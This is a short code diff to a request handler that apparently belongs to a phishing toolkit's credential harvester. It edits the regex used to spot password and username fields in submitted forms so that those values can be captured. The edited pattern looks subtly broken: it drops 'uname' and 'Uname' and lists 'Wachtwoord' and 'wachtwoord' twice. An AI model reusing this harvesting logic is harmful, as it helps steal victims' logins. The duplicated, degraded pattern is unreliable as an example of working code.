@@ -326,7 +326,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 print(bcolors.RED + "POSSIBLE USERNAME FIELD FOUND: " + line + "\r" + bcolors.GREEN)
                 counter = 1
             match2 = re.search(
-                "pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|wachtwoord|Wachtwoord", line)
+                "pwd|pass|uid|Wachtwoord|wachtwoord|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|wachtwoord|Wachtwoord", line)
             if match2:
                 # if you don't want to capture a password, turn this off, note
                 # not an exact science
